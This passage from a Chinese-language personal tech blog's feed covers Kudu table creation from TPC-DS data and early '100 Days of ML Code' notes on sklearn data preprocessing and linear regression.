<span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_returns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_sales;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_sales</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (ws_sold_date_sk,ws_sold_time_sk,ws_ship_date_sk,ws_item_sk,ws_bill_customer_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(ws_sold_date_sk,ws_sold_time_sk,ws_ship_date_sk,ws_item_sk,ws_bill_customer_sk) <span class="keyword">PARTITIONS</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_sales;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_site;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_site</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (web_site_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_site;</span><br></pre></td></tr></table></figure><p>但是存在问题就是<code>Kudu</code>的表需要主键，并且主键需要放置在最前面，但是<code>tpcds</code>默认生成的表格无法把主键放在最前面，所以这样创建的表格主主键包含很多个key，所以还是用上面的方法。</p><hr><p><a href="https://blog.csdn.net/weixin_39478115/article/details/78469837" target="_blank" rel="noopener">kudu性能调优</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;为了测试Kudu的性能，学习了一下大公司SRE生成模拟数据的手段&lt;br&gt;本文会贴上各种原帖，本文仅记录生成过程中遇到的困难和介绍文章中的不同&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="SRE" scheme="http://yoursite.com/categories/SRE/"/>
    
    
      <category term="Analog Data" scheme="http://yoursite.com/tags/Analog-Data/"/>
    
  </entry>
  
  <entry>
    <title>Data Preprocessing | Day 1</title>
    <link href="http://yoursite.com/2020/03/09/day01/"/>
    <id>http://yoursite.com/2020/03/09/day01/</id>
    <published>2020-03-09T10:03:41.351Z</published>
    <updated>2019-05-09T01:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>针对英语文档阅读使用能力和ML知识点开的一个新坑<br>不定期更新<br>尽量使用英语</p></blockquote><a id="more"></a> <h2 id="Data-Preprocessing-Day-1"><a href="#Data-Preprocessing-Day-1" class="headerlink" title="Data Preprocessing | Day 1"></a>Data Preprocessing | Day 1</h2><h3 id="Step-1-Import-the-required-Libraries"><a href="#Step-1-Import-the-required-Libraries" class="headerlink" title="Step 1: Import the required Libraries"></a>Step 1: Import the required Libraries</h3><p>These Two are essential libraries which we will import every time.</p><p>NumPy: Library which contains Mathematical functions.</p><p>Pandas: Library used to import and manage the data sets.</p><h3 id="Step-2-Importing-the-Data-Set"><a href="#Step-2-Importing-the-Data-Set" class="headerlink" title="Step 2: Importing the Data Set"></a>Step 2: Importing the Data Set</h3><p>Data sets are generally available in .csv format. A CSV file stores tabular data in plain text(纯文本). Each lines of the file is a data record. We use the read_csv method of the pandas library to read a local CSV file as a dataframe. Then we make separate(分离) Matrix and Vector of independent and dependent variables from the dataframe.(然后我们从dataframe中制作自变量和因变量的矩阵和向量)</p><h3 id="Step-3-Handling-the-Missing-Data"><a href="#Step-3-Handling-the-Missing-Data" class="headerlink" title="Step 3: Handling the Missing Data"></a>Step 3: Handling the Missing Data</h3><p>The data we get is rarely homogeneous(同质的).Data can be missing due to various and needs to be handled so that it does not reduce the performance of our machine learning model. We can replace the missing data by the Mean or median of the entire column. We use <code>imputer</code> class of <code>sklearn.preprocessing</code> for this task.</p><h3 id="Step-4-Encoding-Categorical-Data"><a href="#Step-4-Encoding-Categorical-Data" class="headerlink" title="Step 4: Encoding Categorical Data"></a>Step 4: Encoding Categorical Data</h3><p>Categorical data are variables that contain label values(标签值) rather than numeric values(数值).The number of possible values is often limited to a fixed set. Example values such as “Yes” and “No” cannot be used in mathematical equations(数学方程) of the model so we need  to encode these variables into numbers. To achieve this we import <code>LabelEncoder</code> class from <code>Sklearn.preprocessing</code> library.</p><h3 id="Step-5-Splitting-the-dataset-into-test-set-and-training-set"><a href="#Step-5-Splitting-the-dataset-into-test-set-and-training-set" class="headerlink" title="Step 5: Splitting the dataset into test set and training set"></a>Step 5: Splitting the dataset into test set and training set</h3><p>We make two partitions of dataset one for training the model called training set and other for testing the performance of the trained model called test set. The split generally 80/20. We import <code>train_test_split()</code> method of <code>sklearn.crossvalidation</code> library.</p><h3 id="Step-6-Feature-Scaling-特征归一化"><a href="#Step-6-Feature-Scaling-特征归一化" class="headerlink" title="Step 6: Feature Scaling(特征归一化)"></a>Step 6: Feature Scaling(特征归一化)</h3><p>Most of the machine learning algorithms use the Euclidean distance(欧式距离) between two data points in their computations, features highly varying(变化) in magnitudes(大小), units and range(范围) pose(提出) problems. high magnitudes(幅度) features will weigh more in the distance calculations than features with low magnitudes. Done by Feature standardization or Z-score normalization(正常化). <code>StandardScalar</code> of <code>sklearn.preprocessing</code> is imported.</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">dataset = pd.read_csv(<span class="string">"D:\\APP\\DataSet\\100-Days-Of-ML-Code-master\\datasets\\Data.csv"</span>)</span><br><span class="line">X = dataset.iloc[ : , :<span class="number">-1</span>].values</span><br><span class="line">Y = dataset.iloc[ : , <span class="number">3</span>].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> Imputer</span><br><span class="line">imputer = Imputer(missing_values = <span class="string">"NaN"</span>, strategy = <span class="string">"mean"</span>, axis = <span class="number">0</span>)</span><br><span class="line">imputer = imputer.fit(X[ : , <span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line">X[ : , <span class="number">1</span>:<span class="number">3</span>] = imputer.transform(X[ : , <span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder, OneHotEncoder</span><br><span class="line">labelencoder_X = LabelEncoder()</span><br><span class="line">X[ : , <span class="number">0</span>] = labelencoder_X.fit_transform(X[ : , <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">onehotencoder = OneHotEncoder(categorical_features = [<span class="number">0</span>])</span><br><span class="line">X = onehotencoder.fit_transform(X).toarray()</span><br><span class="line">labelencoder_Y = LabelEncoder()</span><br><span class="line">Y =  labelencoder_Y.fit_transform(Y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, Y_train, Y_test = train_test_split( X , Y , test_size = <span class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">sc_X = StandardScaler()</span><br><span class="line">X_train = sc_X.fit_transform(X_train)</span><br><span class="line">X_test = sc_X.transform(X_test)</span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>代码详解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure><p>首先我们使用一个简单的数据集。每一个数据集都会包括两部分，独立变量（independent variable）和依赖变量（dependent variable)。机器学习的目的就是需要通过独立变量来预测非独立变量（prediction）。<br>独立变量不会被影响而非独立变量可能被独立变量影响。</p><p>在以下数据集中Age和Salary就是独立变量，我们需要通过这两个独立变量预测是否会Purchase。所以Purchased就是非独立变量。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g2s67p6d2tj209706iq2w.jpg" alt></p><p>把np作为<code>numpy</code>的缩写，后面可以直接使用np来调用各种方法。</p><p>==&gt;</p><p><code>numpy</code>系统是<code>python</code>的一种开源的数值计算扩展。<br>这种工具可用来存储和处理大型矩阵，比<code>python</code>自身的嵌套列表结构要高效的多。<br>你可以理解为凡是和矩阵有关的都用<code>numpy</code>这个库。</p><p>==&gt;</p><p><code>pandas</code>该工具是为了解决数据分析任务而创建的。<code>pandas</code> 纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具。<br><code>pandas</code>提供了大量能使我们快速便捷地处理数据的函数和方法。它是使<code>python</code>成为强大而高效的数据分析环境的重要因素之一.</p><p>==&gt;</p><p>pandas导入语法：</p><ul><li>导入路径斜线问题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_path1 = <span class="string">'D:/0Raw_data/ftm_p.csv'</span></span><br><span class="line">file_path2 = <span class="string">'D:\\0Raw_data\\ftm_p.csv'</span></span><br><span class="line">file_path3 = <span class="string">r'D:\0Raw_data\ftm_p.csv'</span></span><br></pre></td></tr></table></figure><ul><li>中文路径问题</li></ul><p>当错误类型如下，则一般是中文路径问题。</p><p>OSError: Initializing from file failed</p><p>不废话，解决方案就是先用open打开，而且一般用open先打开，能直接解决编码问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="string">'D:/0Raw_data/zhaoyang_charge_sta/京AW7531'</span></span><br><span class="line">path = open(file_path)</span><br><span class="line">data = pd.read_csv(path)</span><br></pre></td></tr></table></figure><ul><li>编码问题</li></ul><p>报错：UnicodeDecodeError: ‘utf-8’ codec can’t decode byte 0xb9 in position 0: invalid start byte</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">file_path = <span class="string">'D:/0Raw_data/zhaoyang_charge_sta/京AW7531'</span></span><br><span class="line">f = open(file_path,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">data = pd.read_csv(f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>解决方案2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">file_path = <span class="string">'D:/0Raw_data/zhaoyang_charge_sta/京AW7531'</span></span><br><span class="line">data = pd.read_csv(<span class="string">'D:/0Raw_data/ftm_p.csv'</span>,encoding=<span class="string">'gbk'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create 独立变量vector</span></span><br><span class="line">X = dataset.iloc[:, :<span class="number">-1</span>].values  <span class="comment"># 第一个冒号是所有列（row），第二个是所有行（column）除了最后一个(Purchased)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create 依赖变量vector</span></span><br><span class="line">Y = dataset.iloc[:, <span class="number">3</span> ].values <span class="comment"># 只取最后一个column作为依赖变量。</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理丢失数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> Imputer</span><br><span class="line">imputer = Imputer(missing_values = <span class="string">'NaN'</span>, strategy = <span class="string">'mean'</span>, axis = <span class="number">0</span>)</span><br><span class="line">imputer = imputer.fit(X[:, <span class="number">1</span>:<span class="number">3</span>])   <span class="comment"># (inclusive column 1, exclusive column 3, means col 1 &amp; 2 逗号之前代表 所有行 ：,后面代表 [1,3)列])</span></span><br><span class="line">X[:, <span class="number">1</span>:<span class="number">3</span>] = imputer.transform(X[:, <span class="number">1</span>:<span class="number">3</span>]) <span class="comment"># 将imputer 应用到数据</span></span><br></pre></td></tr></table></figure><h4 id="sklearn-preprocessing-Imputer解析"><a href="#sklearn-preprocessing-Imputer解析" class="headerlink" title="sklearn.preprocessing.Imputer解析:"></a>sklearn.preprocessing.Imputer解析:</h4><p>sklearn.preprocessing.Imputer(missing_values=’NaN’, strategy=’mean’, axis=0, verbose=0, copy=True)</p><p>missing_values：缺失值，可以为整数或NaN(缺失值numpy.nan用字符串‘NaN’表示)，默认为NaN</p><p>strategy：替换策略，字符串，默认用均值‘mean’替换</p><p>①若为mean时，用特征列的均值替换</p><p>②若为median时，用特征列的中位数替换</p><p>③若为most_frequent时，用特征列的众数替换</p><p>axis：指定轴数，默认axis=0代表列，axis=1代表行</p><p>copy：设置为True代表不在原数据集上修改，设置为False时，就地修改，存在如下情况时，即使设置为False时，也不会就地修改</p><p>①X不是浮点值数组</p><p>②X是稀疏且missing_values=0</p><p>③axis=0且X为CRS矩阵</p><p>④axis=1且X为CSC矩阵</p><p>statistics_属性：axis设置为0时，每个特征的填充值数组，axis=1时，报没有该属性错误</p><p>处理之前：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array([[&apos;France&apos;, 44.0, 72000.0],</span><br><span class="line">       [&apos;Spain&apos;, 27.0, 48000.0],</span><br><span class="line">       [&apos;Germany&apos;, 30.0, 54000.0],</span><br><span class="line">       [&apos;Spain&apos;, 38.0, 61000.0],</span><br><span class="line">       [&apos;Germany&apos;, 40.0, nan],</span><br><span class="line">       [&apos;France&apos;, 35.0, 58000.0],</span><br><span class="line">       [&apos;Spain&apos;, nan, 52000.0],</span><br><span class="line">       [&apos;France&apos;, 48.0, 79000.0],</span><br><span class="line">       [&apos;Germany&apos;, 50.0, 83000.0],</span><br><span class="line">       [&apos;France&apos;, 37.0, 67000.0]], dtype=object)</span><br></pre></td></tr></table></figure><p>处理之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array([[&apos;France&apos;, 44.0, 72000.0],</span><br><span class="line">       [&apos;Spain&apos;, 27.0, 48000.0],</span><br><span class="line">       [&apos;Germany&apos;, 30.0, 54000.0],</span><br><span class="line">       [&apos;Spain&apos;, 38.0, 61000.0],</span><br><span class="line">       [&apos;Germany&apos;, 40.0, 63777.77777777778],</span><br><span class="line">       [&apos;France&apos;, 35.0, 58000.0],</span><br><span class="line">       [&apos;Spain&apos;, 38.77777777777778, 52000.0],</span><br><span class="line">       [&apos;France&apos;, 48.0, 79000.0],</span><br><span class="line">       [&apos;Germany&apos;, 50.0, 83000.0],</span><br><span class="line">       [&apos;France&apos;, 37.0, 67000.0]], dtype=object)</span><br></pre></td></tr></table></figure><h4 id="Sklearn数据预处理中fit-和transform-与fit-transform-的区别"><a href="#Sklearn数据预处理中fit-和transform-与fit-transform-的区别" class="headerlink" title="Sklearn数据预处理中fit()和transform()与fit_transform()的区别"></a>Sklearn数据预处理中fit()和transform()与fit_transform()的区别</h4><ul><li>fit():Method calculates the parameters μ and σ and saves them as internal objects.</li></ul><p>Imputer定义了规则，imputer指定训练范围，进行fit ，这里提到的模型都是非常简单的，无非平均数、方差这种。</p><ul><li>transform():Method using these calculated parameters apply the transformation to a particular dataset.</li></ul><p>transform，我理解是这样的，fit和transform的区别有点类似训练模型和训练数据，transform类似于训练数据这一块的</p><ul><li>fit_transform():joins the fit() and transform() method for transformation of dataset.</li></ul><p>将训练模型和训练数据放到一起的一个步骤。</p><p>Note</p><p>必须先用fit_transform(trainData)，之后再transform(testData)<br>如果直接transform(testData)，程序会报错<br>如果fit_transfrom(trainData)后，使用fit_transform(testData)而不transform(testData)，虽然也能归一化，但是两个结果不是在同一个“标准”下的，具有明显差异。(一定要避免这种情况)</p><p>==&gt;</p><h4 id="什么是独热编码？"><a href="#什么是独热编码？" class="headerlink" title="什么是独热编码？"></a>什么是独热编码？</h4><p> 独热码，在英文文献中称做 one-hot code, 直观来说就是有多少个状态就有多少比特，而且只有一个比特为1，其他全为0的一种码制。举例如下：</p><p>直观来说就是有多少个状态就有多少比特，而且只有一个比特为1，其他全为0的一种码制。举例如下：</p><p>假如有三种颜色特征：红、黄、蓝。在利用机器学习的算法时一般需要进行向量化或者数字化。那么你可能想令 红=1，黄=2，蓝=3。那么这样其实实现了标签编码，即给不同类别以标签。然而这意味着机器可能会学习到“红&lt;黄&lt;蓝”，但这并不是我们的让机器学习的本意，只是想让机器区分它们，并无大小比较之意。</p><p>所以这时标签编码是不够的，需要进一步转换。因为有三种颜色状态，所以就有3个比特。即红色：1 0 0 ，黄色: 0 1 0，蓝色：0 0 1 。</p><p>如此一来每两个向量之间的距离都是根号2，在向量空间距离都相等，所以这样不会出现偏序性，基本不会影响基于向量空间度量算法的效果。</p><h4 id="OneHotEncoder-和-LabelEncoder-独热编码和标签编码"><a href="#OneHotEncoder-和-LabelEncoder-独热编码和标签编码" class="headerlink" title="OneHotEncoder 和 LabelEncoder 独热编码和标签编码"></a>OneHotEncoder 和 LabelEncoder 独热编码和标签编码</h4><p>首先了解机器学习中的特征类别：<strong>连续型特征</strong>和<strong>离散型特征</strong></p><p>拿到获取的原始特征，必须对每一特征分别进行归一化，比如，特征A的取值范围是[-1000,1000]，特征B的取值范围是[-1,1]，如果使用logistic回归，w1<em>x1+w2</em>x2，因为x1取值太大了，所以x2基本起不了作用。所以，必须进行特征的归一化，每个特征都单独进行归一化。</p><p> 对于连续性特征：</p><ul><li><strong>Rescale bounded continuous features</strong>: All continuous input that are bounded, rescale them to [-1, 1] through x = (2x - max - min)/(max - min).    线性放缩到[-1,1]</li><li><strong>Standardize all continuous features</strong>: All continuous input should be standardized and by this I mean, for every continuous feature, compute its mean (u) and standard deviation (s) and do x = (x - u)/s.       放缩到均值为0，方差为1</li></ul><p>对于离散性特征：</p><ul><li><strong>Binarize categorical/discrete features</strong>: 对于离散的特征基本就是按照<strong>one-hot（独热）</strong>编码，该离散特征有多少取值，就用多少维来表示该特征。</li></ul><hr><p>1、方差是各个数据分别与其平均数之差的平方的和的平均数，用字母D表示。在概率论和数理统计中，方差（Variance）用来度量随机变量和其数学期望（即均值）之间的偏离程度。在许多实际问题中，研究随机变量和均值之间的偏离程度有着重要意义。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2tw7h5xxuj208a00z0rz.jpg" alt></p><p>2、平方差公式（difference of two squares）是数学公式的一种，它属于乘法公式、因式分解及恒等式，被普遍使用。平方差指一个平方数或正方形，减去另一个平方数或正方形得来的乘法公式：a²-b²=(a+b)(a-b)</p><p>3、标准差（Standard Deviation） ，中文环境中又常称均方差，但不同于均方误差（mean squared error，均方误差是各数据偏离真实值的距离平方的平均数，也即误差平方和的平均数，计算公式形式上接近方差，它的开方叫均方根误差，均方根误差才和标准差形式上接近），标准差是离均差平方和平均后的方根，用σ表示。假设有一组数值X1,X2,X3,……XN（皆为实数），其平均值（算术平均值）为μ，公式如图。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2tw8bxdo1j204601o3y9.jpg" alt></p><p>概率论还是要慢慢补。。。</p><hr><p>Reference：</p><p><a href="https://blog.csdn.net/appleyuchi/article/details/73503282" target="_blank" rel="noopener">https://blog.csdn.net/appleyuchi/article/details/73503282</a></p><p><a href="https://scikit-learn.org/stable/_downloads/scikit-learn-docs.pdf" target="_blank" rel="noopener">scikit-learn user guide</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;针对英语文档阅读使用能力和ML知识点开的一个新坑&lt;br&gt;不定期更新&lt;br&gt;尽量使用英语&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
      <category term="100 Days Of ML Code" scheme="http://yoursite.com/categories/Mechine-Learning/100-Days-Of-ML-Code/"/>
    
    
      <category term="sklearn" scheme="http://yoursite.com/tags/sklearn/"/>
    
      <category term="OneHotEncoder" scheme="http://yoursite.com/tags/OneHotEncoder/"/>
    
      <category term="LabelEncoder" scheme="http://yoursite.com/tags/LabelEncoder/"/>
    
  </entry>
  
  <entry>
    <title>Simple Linear Regression | Day 2</title>
    <link href="http://yoursite.com/2020/03/09/day02/"/>
    <id>http://yoursite.com/2020/03/09/day02/</id>
    <published>2020-03-09T10:03:41.335Z</published>
    <updated>2019-05-23T09:42:46.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这边还是直接贴上原图吧，手打实在是比较累，而且我按图打字的时候容易分心，很容易变成机械运动，不如直接上图。</p></blockquote><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g39v8hb3uzj20m81jk4qp.jpg" alt></p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">dataset = pd.read_csv(<span class="string">'F:\\dataset\\100-Days-Of-ML-Code-master\\datasets\\studentscores.csv'</span>)</span><br><span class="line">X = dataset.iloc[ : ,   : <span class="number">1</span> ].values</span><br><span class="line">Y = dataset.iloc[ : , <span class="number">1</span> ].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, Y_train, Y_test = train_test_split( X, Y, test_size = <span class="number">1</span>/<span class="number">4</span>, random_state = <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line">regressor = LinearRegression()</span><br><span class="line">regressor = regressor.fit(X_train, Y_train)</span><br><span class="line"></span><br><span class="line">Y_pred = regressor.predict(X_test)</span><br><span class="line"></span><br><span class="line">plt.scatter(X_train , Y_train, color = <span class="string">'red'</span>)</span><br><span class="line">plt.plot(X_train , regressor.predict(X_train), color =<span class="string">'blue'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3bbvz6ns6j20ac070mx2.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.scatter(X_test , Y_test, color = <span class="string">'red'</span>)</span><br><span class="line">plt.plot(X_test , regressor.predict(X_test), color =<span class="string">'blue'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3bbwiv3v2j20ac070q2u.jpg" alt></p><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><p>第二天的内容比较简单，没有需要特别结实的内容</p><p>值得注意的是，最后两个测试结果可视化和训练结果可视化内容里面的向量其实是一样的，<code>Y_pred = regressor.predict(X_test)</code>这一步其实类似于保存结果，但是后面不知道为什么没有直接使用起来，有点奇怪。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这边还是直接贴上原图吧，手打实在是比较累，而且我按图打字的时候容易分心，很容易变成机械运动，不如直接上图。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
      <category term="100 Days Of ML Code" scheme="http://yoursite.com/categories/Mechine-Learning/100-Days-Of-ML-Code/"/>
    
    
      <category term="Linear Regression" scheme="http://yoursite.com/tags/Linear-Regression/"/>
    
  </entry>
  
  <entry>
    <title>Multiple Linear Regression | Day 3</title>
    <link href="http://yoursite.com/2020/03/09/day03/"/>
    <id>http://yoursite.com/2020/03/09/day03/</id>
    <published>2020-03-09T10:03:40.983Z</published>
    <updated>2019-05-23T23:57:08.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>多元线性回归</p></blockquote><a id="more"></a> <p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3beehr6fqj20m81jke81.jpg" alt></p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><h4 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h4><p>For a successful regression analysis. It’s essential to validate these assumptions.</p><ol><li><p>Linearity: The relationship between dependent and independent variables should be Linear.</p></li><li><p>Homoscedasticity 方差齐性: (constant variance 恒定方差) of the errors should be maintained.  方差：离散程度的度量</p></li><li>Multivarivate Normality(多元正态性):  Multiple regression assumes that the residuals are normally distributed.</li><li>Lack of Multicollinearity(没有多重共线性，由于存在精确相关关系或者高度相关关系而使模型估计失真或难以估计准确): It is assumed that there is little or no multicollinearity in the data. Multicollinearity occurs when the features (or independent variables) are not independent of each other.</li></ol><h4 id="Dummy-Variables-虚变量、哑变量"><a href="#Dummy-Variables-虚变量、哑变量" class="headerlink" title="Dummy Variables(虚变量、哑变量)"></a>Dummy Variables(虚变量、哑变量)</h4><p>Using categorical data in Multiple Regression Models is a powerful method to include non-numeric data types into a regression model.</p><p>Categorical data refers to data values which represent categories - data values with a fixed and unordered number of values. for instance, gender(male/female). In a regression model, these values can be represented bu dummy variables - variables containing values such as 1 or 0 representing the presence or absence of the categorical.</p><h4 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h4><p>having too many variables could potentially cause our model to become less accurate. especially if certain variables have no effect on the outcome or have a significant effect on other variables. There are various methods to select the appropriate various methods to select the appropriate variable like -</p><ol><li>Forward Selection</li><li>Backward Elimination</li><li>Bi-directional Comparision</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;多元线性回归&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
      <category term="100 Days Of ML Code" scheme="http://yoursite.com/categories/Mechine-Learning/100-Days-Of-ML-Code/"/>
    
    
      <category term="Linear Regression" scheme="http://yoursite.com/tags/Linear-Regression/"/>
    
  </entry>
  
  <entry>
    <title>Grokking Algorithms</title>
    <link href="http://yoursite.com/2020/03/09/Grokking%20Algorithms/"/>
    <id>http://yoursite.com/2020/03/09/Grokking Algorithms/</id>
    <published>2020-03-09T10:03:40.785Z</published>
    <updated>2019-05-29T22:59:14.000Z</updated>
    
